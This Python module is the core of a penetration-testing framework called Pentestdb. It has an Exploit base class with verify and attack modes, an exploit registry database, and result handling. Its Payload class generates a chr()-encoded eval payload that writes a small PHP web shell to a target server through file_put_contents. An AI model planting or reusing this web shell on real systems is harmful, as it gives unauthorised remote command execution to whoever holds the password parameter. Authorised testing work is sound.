#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Pentestdb, a database for penetration test.
Copyright (c) 2014-2015 alpha1e0
=============================================================
Exploit 模块
'''

import os
import sys
import re
import time
import inspect
import importlib
import urlparse
import urllib

import requests

from libs.orm import Model
from libs.orm import StringField
from libs.orm import TextField
from libs.commons import Output
from libs.coder import Code



OS = ['windows','linux','unix','else']
WEBSERVER = ['iis','apache','nginx','lighthttpd','tomcat','jboss','weblogic','websphere','resin','glassfish']
LANGUAGE = ['php','asp','asp.net','java']



class ExploitError(Exception):
    def __init__(self, msg):
        self.errorMsg = msg

    def __str__(self):
        return "Exploit Error, {0}".format(self.errorMsg)



class NotImplementError(ExploitError):
    def __str__(self):
        return "Method not implemented."



class ExploitResultError(ExploitError):
    def __str__(self):
        return "ExploitResult Error, {0}".format(self.errorMsg)



def loadExpClass(expFile):
    expFile = os.path.join(sys.path[0], "exploit", os.path.split(expFile)[-1])
    if not os.path.exists(expFile):
        raise ExploitError(u"找不到exploit文件'{0}'".format(expFile))

    fileName = os.path.split(expFile)[-1]
    fileName = fileName.endswith(".pyc") and fileName[:-4] or fileName.endswith(".py") and fileName[:-3] or fileName
    expModuleName = ".".join(['exploit', fileName])

    module = importlib.import_module(expModuleName)

    for member in dir(module):
        expClass = getattr(module, member)
        if inspect.isclass(expClass):
            if issubclass(expClass, Exploit) and expClass.__name__ != 'Exploit':
                break
    else:
        raise ExploitError(u"'{0}'中找不到exploit定义".format(expFile))

    return expClass



class ExpModel(Model):
    '''
    维护exploit数据库
    '''
    _table = "expinfo"
    _database = os.path.join(sys.path[0],"exploit","exploit.db")

    expName = StringField(primarykey=True,ddl="varchar(255)",notnull=True,vrange="1-255")
    expFile = StringField(ddl="vchar(255)",notnull=True,vrange="1-255")
    version = StringField(ddl="vchar(100)",vrange="1-100")
    author = StringField(ddl="vchar(100)",vrange="1-100")
    createDate = StringField(ddl="date")
    vulDate = StringField(ddl="date")
    vulType = StringField(ddl="vchar(100)",vrange="1-100")
    os = StringField(ddl="vchar(100)",vrange="1-100")
    webserver = StringField(ddl="vchar(255)",vrange="1-255")
    language = StringField(ddl="vchar(100)",vrange="1-100")
    appName = StringField(ddl="vchar(255)",vrange="1-255")
    appVersion = StringField(ddl="vchar(100)",vrange="1-100")
    reference = StringField(ddl="vchar(2048)",vrange="1-2048")
    description = TextField(ddl="text")


    def __eq__(self, other):
        if not isinstance(other,Project):
            raise ModelError("the right instance is not Project")

        return self.getVal('expName') == other.getVal('expName')



class Result(dict):
    '''
    Result保存exploit输出信息，有以下属性：
        target : exploit的目的主机
        expname : exploit名称
        isvul : 是否存在漏洞
            0 : 不存在漏洞
            1 : 存在漏洞
            2 : 有辅渗透信息（用于payload生成类型的exploit）
        fullpath : 目标全路径
        paramtype : exploit发送请求的类型，GET/POST等
        params : exploit发送请求的内容
        payload : exploit使用的有效payload
        info : exploit执行返回的信息，例如数据库账户名等
        shellpath : 写入的shell路径地址
        attachment : 附件
        elseinfo : 其他信息
    
    '''
    _allowAttribute = ['target', 'expname', 'isvul', 'fullpath', 'paramtype', 'params', 'payload', 'info', 'shellpath', 'attachment', 'elseinfo']
    
    def __init__(self, expObject=None):
        if expObject:
            if isinstance(expObject, Exploit):
                self['target'] = expObject.host
                self['expname'] = expObject.expName


    def __getitem__(self, key):
        if key not in self._allowAttribute:
            raise ExploitResultError("key '{0}' is not allowed".format(key))
        else:
            return super(Result,self).__getitem__(key)


    def __setitem__(self, key, value):
        if key not in self._allowAttribute:
            raise ExploitResultError("key '{0}' is not allowed".format(key))
        else:
            return super(Result,self).__setitem__(key,value)


    def __str__(self):
        resultStr = ""
        if self.get("FailedInfo", None):
            resultStr = Output.G(u"Exploit执行失败，原因：{0}".format(self['FailedInfo']['reason']).encode(sys.stdout.encoding))
            return resultStr

        for key,value in self.iteritems():
            for vkey,vvalue in value.iteritems():
                resultStr = resultStr + Output.R(key + ": ") + Output.Y(vkey + ": ") + vvalue + "\n"

        if not resultStr:
            resultStr = Output.G(u"Exploit执行失败, 目标系统可能不存在漏洞".encode(sys.stdout.encoding))
            return resultStr

        return Output.G(u"目标系统可能存在漏洞，具体信息:\n".encode(sys.stdout.encoding)) + resultStr.strip()



def _strCookie2Dict(strCookie):
    strCookie = strCookie.strip()
    result = []
    for cookiePair in strCookie.split(";"):
        cookiePair = cookiePair.strip()
        if not cookiePair:
            continue
        try:
            name,value = cookiePair.split("=")
        except ValueError:
            name,value = cookiePair,""
        except Exception as ex:
            raise ExploitError(str(ex))
        name,value = name.strip(), value.strip()
        if not name:
            continue
        pair = dict()
        pair['name'] = name
        pair['value'] = value
        result.append(pair)

    return result



class Exploit(object):
    '''
    Exploit基类
    Input:
        url: 目标url
        headers: http headers, 字典类型
        elseArgs: 其他参数, 字典类型
    '''
    def __init__(self, url="", cookie="", headers={}, elseArgs={}):
        self.url = url.strip()
        self.host, self.baseURL, self.params = self.urlFormat()
        self.elseArgs = elseArgs

        cookie = cookie.strip()
        self.http = requests.Session()
        if cookie:
            for item in _strCookie2Dict(cookie):
                self.http.cookies.set(item['name'],item['value'])

        self.http.headers.update(headers)

        self.register()


    def execute(self, mode="verify"):
        try:
            if mode == "attack":
                result = self._attack()
            else:
                result = self._verify()
        except requests.ConnectionError as error:
            result = Result()
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = "Connection Error"
        except NotImplementError:
            try:
                result = self._info()
            except Exception as error:
                result = Result()
                result['FailedInfo'] = {}
                result['FailedInfo']['reason'] = str(error)
        except Exception as error:
            result = Result()
            result['FailedInfo'] = {}
            result['FailedInfo']['reason'] = str(error)
        finally:
            self.http.close()

        return result


    def _info(self):
        raise NotImplementError()


    def _verify(self):
        raise NotImplementError()


    def _attack(self):
        raise NotImplementError()


    def register(self):
        '''
        注册exploit信息
        '''
        expInfo = dict()
        for key in self.__class__.__dict__:
            if key in ExpModel._mapping:
                expInfo[key] = self.__class__.__dict__[key]

        if ExpModel.get(expInfo['expName']):
            return True
        else:
            expInfo['createDate'] = time.strftime("%Y-%m-%d")
            expInfo['expFile'] = self.__module__.split(".")[-1] + ".py"

            ExpModel.insert(**expInfo)


    def update(self):
        '''
        更新exploit信息
        '''
        expInfo = dict()
        for key in self.__class__.__dict__:
            if key in ExpModel._mapping:
                expInfo[key] = self.__class__.__dict__[key]

        if ExpModel.get(expInfo['expName']):
            ExpModel.where(expName=expInfo['expName']).update(**expInfo)
        else:
            ExpModel.insert(**expInfo)


    def urlFormat(self):
        '''
        格式化url，返回host/baseURL/params信息
        '''
        splited = urlparse.urlparse(self.url)
        host = splited[0] + "://" + splited[1]
        baseURL = host + splited[2]
        params = dict()

        for param in splited[4].split("&"):
            if not param:
                continue
            sp = param.split("=")
            try:
                params[sp[0]] = urllib.unquote(sp[1])
            except IndexError:
                params[sp[0]] = ""

        return (host, baseURL, params)


    def urlJoin(self, path):
        '''
        合并url，如果self.url包含path则返回self.url，否则返回self.host+path
        '''
        path = path.strip()
        keyword = path.split("/")[-1]
        if keyword not in self.url:
            return self.host.rstrip("/") + "/" + path.lstrip("/")
        else:
            return self.url


class Payload(object):
    '''
    常用Payload生成
    '''
    def __init__(self, payload=None):
        self.payload = payload


    @classmethod
    def phpWriteFile(cls, path, content):
        code = "file_put_contents({0}, {1});".format(path,content)

        encodedCode = ".".join(["chr({0})".format(ord(x)) for x in code])
        encodedCode = "eval({0});".format(encodedCode)

        return encodedCode


    @classmethod
    def phpWriteShell(cls, path):
        shell = '<?php $f=strrev($_GET["f"]);$f($_POST["pass"]);?>'

        return cls.phpWriteFile(path, shell)


    def urlEncode(self):
        return urllib.quote(self.payload)


    def urlAllEncode(self):
        code = Code(self.payload)

        return code.encode("url-all")


    def unicodeEncode(self):
        pass


    def unicodeAllEncode(self):
        pass